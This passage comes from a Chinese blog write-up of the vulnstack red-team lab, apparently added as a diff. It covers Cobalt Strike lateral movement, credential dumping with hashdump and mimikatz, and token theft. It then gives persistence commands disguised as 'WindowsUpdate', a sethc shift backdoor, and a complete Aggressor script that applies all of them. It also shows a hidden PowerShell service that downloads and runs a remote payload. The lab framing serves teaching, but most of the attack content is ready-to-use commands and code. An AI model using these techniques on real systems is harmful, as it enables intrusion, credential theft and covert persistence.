+<li>只能链接由同一Cobalt Strike实例管理的Beacon。</li>
+</ol>
+<h4 id="进一步窃取内网主机hash"><a href="#进一步窃取内网主机hash" class="headerlink" title="进一步窃取内网主机hash"></a>进一步窃取内网主机hash</h4><ol>
+<li>新建一个 Listener 监听器，payload设置为Beacon SMB。</li>
+<li>在已有的Beacon上右击Spawn(生成会话/派生)，选择创建的smb beacon的listener。<img data-src="//tva4.sinaimg.cn/large/006Glg0Bgy1gpiyxgqrxsj30qp0krabt.jpg" alt="">运行成功后 external 可以看到 ∞∞ 这个字符 ，这就是派生的SMB Beacon 当前是连接状态 也可以在主Beacon上 用link host链接它 或者unlink host断开它 。（我们可以在透视图中查看，如果连接线上显示disconnected就表示断开了）<img data-src="//tva2.sinaimg.cn/large/006Glg0Bgy1gpj1406ckqj317e0kradj.jpg" alt=""></li>
+<li><h4 id="作为跳板进行内网穿透"><a href="#作为跳板进行内网穿透" class="headerlink" title="作为跳板进行内网穿透"></a>作为跳板进行内网穿透</h4>&emsp;前提是能够通过shell之类的访问到内网其它主机。</li>
+<li>psexec 使用凭证登录其它主机，右击选择一台非域控主机的psexec模块监听器选择对应的<code>smb beacon</code> 会话。然后如果另一台的密码或hash一至就可以成功获得一个<code>smb</code> 连接。在beacon中执行了如下命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token GOD.ORG\Administrator 密码</span><br><span class="line">[*] Tasked beacon to create a token for GOD.ORG\Administrator</span><br><span class="line">beacon&gt; jump psexec ROOT-TVI862UBEH local-82-</span><br></pre></td></tr></table></figure></li>
+<li>token 窃取，直接窃取token来登录其它机器，需要密码一至。选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表。然后选择<code>GOD\Administrator</code> 的 token 盗取(不一定是要这个用户，只要感觉他们密码可能一至都试试也行):<img data-src="//tvax2.sinaimg.cn/large/006Glg0Bgy1gpj1x7qh4sj317e0mgad8.jpg" alt=""><br>随后我们再使用psexec然后勾选下面的<code>使用当前会话的访问令牌</code>注意选定好对应进程。<br><img data-src="//tva2.sinaimg.cn/large/006Glg0Bgy1gpj20ht7kxj30k50dw74y.jpg" alt=""></li>
+</ol>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>windows 首选 <code>attrib</code>，使用这个命令可以直接添加隐藏属性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib C:\test.exe +s +h</span><br></pre></td></tr></table></figure>
+<p><code>+s</code>是设置系统属性，<code>+h</code>设置隐藏属性，如果需要取消将<code>+</code>换成<code>-</code>即可。</p>
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p><code>schtasks</code> 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务。替代 AT.exe，使用以下命令可以快捷的创建一个定时任务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn WindowsUpdate &#x2F;tr “C:\test.txt” &#x2F;sc minute &#x2F;mo 1</span><br></pre></td></tr></table></figure>
+<p><code>/create</code> 是创建新任务，<code>/TN</code> 是<code>TaskName</code>的简写，也就是新建的任务的名字，在系统必须唯一，<code>/TR</code>是<code>TaskRun</code>的简写，即为需要运行的程序的路径和文件名。<code>/SC</code>是<code>schedule</code>的简写，指定执行的频率的时间单位， <code>/MO</code>是<code>modifier</code>的缩写，可以理解为执行的频率的时间数值。如果任务已经在执行<code>schtasks</code>并不会重复拉起任务。相比at来说，schtasks的优势在于可以周期运行，重复检索任务是否处于运行状态，可使用下面的命令删除：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;delete &#x2F;tn WindowsUpdate</span><br></pre></td></tr></table></figure>
+<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>windows系统的开机项位于注册表的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+<p>新建一个字符串值并修改数值数据为程序路径即可。命令行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v WindowsUpdate &#x2F;t REG_SZ &#x2F;d &quot;C:\test.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
+<h3 id="shift-后门"><a href="#shift-后门" class="headerlink" title="shift 后门"></a>shift 后门</h3><p>挺老的东西了，需要system权限才能实现，如果我们可以把cmd.exe这个程序更名称sethc.exe并且把原来的sethc.exe替换掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\WINDOWS\system32\cmd.exe  C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+<h3 id="Windows-服务"><a href="#Windows-服务" class="headerlink" title="Windows 服务"></a>Windows 服务</h3><p>在windows上系统服务可以用<code>SC</code> 命令进行增删改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;WindowsUpdate&quot; binpath&#x3D; &quot;cmd &#x2F;c start C:\test.exe&quot;;</span><br><span class="line">sc config &quot;WindowsUpdate&quot; start&#x3D; auto</span><br><span class="line">net start WindowsUpdate</span><br></pre></td></tr></table></figure>
+<p>需要注意参数值与等号之间要有空格。使用Windows服务进行自启有个很有意思的地方，默认是以<code>system</code>权限启动，也是“提权”的一种不错的方式。另外有个小坑，<code>sc</code>在powershell中传参有问题，执行不成功，<strong>必须在cmd里执行</strong>。</p>
+<h3 id="自启目录"><a href="#自启目录" class="headerlink" title="自启目录"></a>自启目录</h3><p>本质上来说和注册表修改是同一个，一个是复制文件，一个是修改注册表。接受方式不同，顺便一起记一下了。命令行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\test.exe&quot; &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; &#x2F;y</span><br><span class="line">attrib &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; +s +h</span><br></pre></td></tr></table></figure>
+<p>这里有个值得提起注意，如果用户不是Administrator，目录得改为相应用户。</p>
+<h3 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">    menu &quot;权限维持&quot; &#123;</span><br><span class="line"></span><br><span class="line">        item &quot;设置路径&quot; &#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                prompt_text(&quot;filePath&quot;, $filePath, &#123;</span><br><span class="line">                    $filePath &#x3D; $1;</span><br><span class="line">                    return $filePath;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        item &quot;隐藏文件&quot; &#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;attrib \&quot;$filePath\&quot; +s +h&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        item &quot;定时任务&quot; &#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;schtasks &#x2F;create &#x2F;tn WindowsUpdate &#x2F;tr \&quot;$filePath\&quot; &#x2F;sc minute &#x2F;mo 1&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        item &quot;注册表&quot;&#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run &#x2F;v WindowsUpdate &#x2F;t REG_SZ &#x2F;d \&quot;$filePath\&quot; &#x2F;f&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        item &quot;SC服务&quot;&#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;sc create \&quot;WindowsUpdate\&quot; binpath&#x3D; \&quot;cmd &#x2F;c start \&quot;$filePath\&quot;\&quot;&amp;&amp;sc config \&quot;WindowsUpdate\&quot; start&#x3D; auto&amp;&amp;net start WindowsUpdate&quot;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        item &quot;shift启动&quot;&#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;takeown &#x2F;f C:\\windows\\system32\\sethc.* &#x2F;a &#x2F;r &#x2F;d y&amp;&amp;cacls C:\\windows\\system32\\sethc.exe &#x2F;T &#x2F;E &#x2F;G system:F&amp;&amp;copy \&quot;$filePath\&quot; C:\\windows\\system32\\sethc.exe &#x2F;y&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        item &quot;自启动目录&quot;&#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;copy \&quot;$filePath\&quot; \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; &#x2F;y&quot;);</span><br><span class="line">                bshell($1, &quot;attrib \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; +s +h&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        item &quot;懒人攻略&quot; &#123;</span><br><span class="line">            local(&#39;$bid&#39;);</span><br><span class="line">            foreach $bid ($1)&#123;</span><br><span class="line">                bshell($1, &quot;attrib \&quot;$filePath\&quot; +s +h&quot;);</span><br><span class="line">                bshell($1, &quot;schtasks &#x2F;create &#x2F;tn WindowsUpdate &#x2F;tr \&quot;$filePath\&quot; &#x2F;sc minute &#x2F;mo 1&quot;);</span><br><span class="line">                bshell($1, &quot;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run &#x2F;v WindowsUpdate &#x2F;t REG_SZ &#x2F;d \&quot;$filePath\&quot; &#x2F;f&quot;);</span><br><span class="line">                bshell($1, &quot;sc create \&quot;WindowsUpdate\&quot; binpath&#x3D; \&quot;cmd &#x2F;c start \&quot;$filePath\&quot;\&quot;&amp;&amp;sc config \&quot;WindowsUpdate\&quot; start&#x3D; auto&amp;&amp;net start WindowsUpdate&quot;);</span><br><span class="line">                bshell($1, &quot;takeown &#x2F;f C:\\windows\\system32\\sethc.* &#x2F;a &#x2F;r &#x2F;d y&amp;&amp;cacls C:\\windows\\system32\\sethc.exe &#x2F;T &#x2F;E &#x2F;G system:F&amp;&amp;copy \&quot;$filePath\&quot; C:\\windows\\system32\\sethc.exe &#x2F;y&quot;);</span><br><span class="line">                bshell($1, &quot;copy \&quot;$filePath\&quot; \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; &#x2F;y&quot;);</span><br><span class="line">                bshell($1, &quot;attrib \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; +s +h&quot;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先设置好远控所在的目录，然后执行懒人攻略，重启正常情况下即可弹回四个会话。（一个system，三个admin）<a href="https://github.com/TheKingOfDuck/myScripts/blob/master/PrivilegeHelper.cna" target="_blank" rel="noopener">【github链接】</a><br><strong>需要先设置文件路径</strong><br><img data-src="//tvax4.sinaimg.cn/large/006Glg0Bgy1gpj39cpia2j30jq0h5tdl.jpg" alt=""></p>
+<h3 id="创建一个-web-Delivery-服务自启"><a href="#创建一个-web-Delivery-服务自启" class="headerlink" title="创建一个 web Delivery 服务自启"></a>创建一个 web Delivery 服务自启</h3><p>先创建一个<code>Scripted web delivery</code><br><img data-src="//tvax4.sinaimg.cn/large/006Glg0Bgy1gpj3hnprsoj30dm0c974r.jpg" alt=""><br>然后在beacon中输入如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;ALGS&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.152.152:801&#x2F;a&#39;))&quot;&#39;))\&quot;</span><br><span class="line">#生成一个ALGS服务 </span><br><span class="line">shell SC config &quot;ALGS&quot; start&#x3D; auto      #设置name服务为自动 </span><br><span class="line">shell SC description &quot;ALGS&quot; &quot;description&quot;    #设置服务描述</span><br><span class="line">shell net start &quot;ALGS&quot;     #启动服务</span><br><span class="line">------------</span><br><span class="line">shell SC delete &quot;ALGS&quot;      #删除服务</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><p>一般拿到<code>shell</code>我们首先调低心跳值。然后查下本机的基本信息如: <code>whoami</code>、<code>hostname</code>、<code>net user</code>、<code>net localgroup administrators</code>。<br><img data-src="//tva4.sinaimg.cn/large/006Glg0Bgy1gpj3tr89h6j30uc0dxdgj.jpg" alt=""></p>
+<p>查看系统架构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tvax4.sinaimg.cn/large/006Glg0Bgy1gpj3vtyzczj30du046jrb.jpg" alt=""><br>还有<code>systeminfo</code> 可以列出很多信息。<br>我们还可以查询一下已安装的软件，从中找到利用点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tvax4.sinaimg.cn/large/006Glg0Bgy1gpj3zqr5ioj30om09r3yv.jpg" alt=""><br>然后还可以利用CS查看一下进程，具体不说了。<br>参见的杀软进程：<a href="https://blog.csdn.net/qq_36119192/article/details/107141281" target="_blank" rel="noopener">【参考链接】</a><br>还有就是利用cs查看一下账号密码或者hash，已经开放了哪些端口。</p>
+<h3 id="其它主机信息收集"><a href="#其它主机信息收集" class="headerlink" title="其它主机信息收集"></a>其它主机信息收集</h3><p>利用 <code>net view</code> ，<code>port scan</code> 发现一下其它的主机及开放端口，<code>port scan</code> 可以扫ip和端口。<br>使用<code>ipconfig /all</code> 查看DNS服务器，判断一下是否在域内。<br>使用<code>net view /domain</code> 可以查看主域。<br><code>net time /domain</code>查看服务器的时间<img data-src="//tva2.sinaimg.cn/large/006Glg0Bgy1gpji48bzsqj30me06o3yl.jpg" alt="">如果回显 <code>Workgroup</code> 则说明不存在域，如果顺利显示时间说明存在域且是域用户。像这里报系统错误5 则说明有域但是不在域用户内。<br>查询当前的登录域与用户信息：<code>net config workstation</code><br><img data-src="//tvax3.sinaimg.cn/large/006Glg0Bgy1gpji7rdusyj30mp09aaai.jpg" alt=""></p>
+<h4 id="找域控"><a href="#找域控" class="headerlink" title="找域控"></a>找域控</h4><p>我们知道一般域控和dns服务器是在一起的，所以我们<code>nslookup</code>查一下域名服务器就行。<br><img data-src="//tvax1.sinaimg.cn/large/006Glg0Bgy1gpjinrfqnuj30gw09a74f.jpg" alt=""><br>可以知道我们DC IP为192.168.72.130</p>
+<p>等等等等，收集自己需要的信息。（因为还是入门不太清楚有些信息的作用就先不记了）<br>刚觉就是收集下hash密码，有没有进一步的内网，扫下ip端口，系统版本，程序。根据特定情况提权。通过hash密码、系统漏洞横向移动。</p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>到这里我已经感觉记录越来越枯燥了（哈哈哈）<br>横向渗透需要在保证自己安全的前提下将已攻占的主机最大化地利用。常用的有数据挖掘、后门类、攻击类。</p>
+<h3 id="利用CS的-psexec"><a href="#利用CS的-psexec" class="headerlink" title="利用CS的 psexec"></a>利用CS的 psexec</h3><p>这个主要是利用本机查到的凭证去发展其它主机，这里需要与它的密码一致或者我们知道它的密码。只能说拼手气吧。</p>
+<ol>
+<li>利用<code>hashdump</code> 读内存密码：hashdump，用 <code>mimikatz</code> 读注册表密码：logonpasswords。爆出已知密码和hash</li>
+<li>凭据信息可以查看到信息。<img data-src="//tva1.sinaimg.cn/large/006Glg0Bgy1gpjjrwf4g1j316o0b1jse.jpg" alt=""></li>
+<li>到目标窗口选择要参试的目标，随后进行psexec选择一个listener和一个进程。然后听天由命了。</li>
+</ol>
+<h4 id="利用进程的token"><a href="#利用进程的token" class="headerlink" title="利用进程的token"></a>利用进程的token</h4><p>这种情况应该是前面爆密码什么的都没起到作用，当此时本机的token可以登录目标主机。</p>
+<ol>
+<li>选择一个目标查看进程</li>
+<li>选择一个适当的（用户、架构等）点击<code>Steal Token</code><img data-src="//tva4.sinaimg.cn/large/006Glg0Bgy1gpjjzx5xtoj317e0mgtbj.jpg" alt=""></li>
+<li>随后又是到psexec那里，不同的就是勾选“使用当前进程的token”(前面说过了)注意选对session。</li>
+</ol>
+<h3 id="利用-系统漏洞"><a href="#利用-系统漏洞" class="headerlink" title="利用 系统漏洞"></a>利用 系统漏洞</h3><p>这里我们可以利用目标主机的系统漏洞，比如<code>ms17_010</code> 也可以与msf联动使用一些系统漏洞进行入侵。<br>与msf联动前面说了。直接利用就行，然后利用成功再将session传回cobaltstrike。</p>
+<p><strong>不想记录了，先这样吧，后面实在不好记录也灭必要。后面又新知识再补充。这个靶场还可以继续做实验。</strong></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" title="vulnstack-ATT&amp;CK实战系列 红队实战（一）">https://mayi077.github.io/2021/04/14/vulnstack-ATT-CK实战系列-红队实战（一）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i>内网学习</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i>内网靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/09/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="prev" title="域内横向移动">
+      <i class="fa fa-chevron-left"></i> 域内横向移动
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/15/PHP-%E6%AD%A3%E5%88%99%E7%9A%84-m%E5%A4%9A%E8%A1%8C%E6%A8%A1%E5%BC%8F/" rel="next" title="PHP 正则的 m多行模式">
+      PHP 正则的 m多行模式 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#VM1-也就是-win7"><span class="nav-number">2.1.</span> <span class="nav-text">VM1 也就是 win7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VM2-也就是-win2003"><span class="nav-number">2.2.</span> <span class="nav-text">VM2 也就是 win2003</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VM3-也就是-win2008"><span class="nav-number">2.3.</span> <span class="nav-text">VM3 也就是 win2008</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#外网信息收集"><span class="nav-number">3.</span> <span class="nav-text">外网信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#主机发现以及端口扫描"><span class="nav-number">3.1.</span> <span class="nav-text">主机发现以及端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描web站的信息，可以使用dirsearch"><span class="nav-number">3.2.</span> <span class="nav-text">扫描web站的信息，可以使用dirsearch</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#突破边界"><span class="nav-number">4.</span> <span class="nav-text">突破边界</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用phpMyadmin"><span class="nav-number">4.1.</span> <span class="nav-text">利用phpMyadmin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）、判断phpmyadmin版本"><span class="nav-number">4.1.1.</span> <span class="nav-text">（1）、判断phpmyadmin版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-、phpMyAdmin-漏洞利用"><span class="nav-number">4.1.2.</span> <span class="nav-text">(2)、phpMyAdmin 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用into-outfile-拿webshell"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">利用into outfile 拿webshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用日志get-shell"><span class="nav-number">4.1.2.2.</span> <span class="nav-text">利用日志get shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过慢查询写webshell"><span class="nav-number">4.1.2.3.</span> <span class="nav-text">通过慢查询写webshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-yxcms-getshell"><span class="nav-number">4.2.</span> <span class="nav-text">利用 yxcms getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上线Cobalt-strike-以及联动-msf"><span class="nav-number">5.</span> <span class="nav-text">上线Cobalt strike 以及联动 msf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CS-gt-MSF"><span class="nav-number">5.1.</span> <span class="nav-text">CS -&gt; MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-gt-CS"><span class="nav-number">5.2.</span> <span class="nav-text">MSF -&gt; CS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobalt-Strike-上进行操作"><span class="nav-number">6.</span> <span class="nav-text">Cobalt Strike 上进行操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Beacon"><span class="nav-number">6.1.</span> <span class="nav-text">SMB Beacon</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#进一步窃取内网主机hash"><span class="nav-number">6.1.1.</span> <span class="nav-text">进一步窃取内网主机hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#作为跳板进行内网穿透"><span class="nav-number">6.1.2.</span> <span class="nav-text">作为跳板进行内网穿透</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">7.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏文件"><span class="nav-number">7.1.</span> <span class="nav-text">隐藏文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定时任务"><span class="nav-number">7.2.</span> <span class="nav-text">定时任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表"><span class="nav-number">7.3.</span> <span class="nav-text">注册表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shift-后门"><span class="nav-number">7.4.</span> <span class="nav-text">shift 后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-服务"><span class="nav-number">7.5.</span> <span class="nav-text">Windows 服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自启目录"><span class="nav-number">7.6.</span> <span class="nav-text">自启目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自动化脚本"><span class="nav-number">7.7.</span> <span 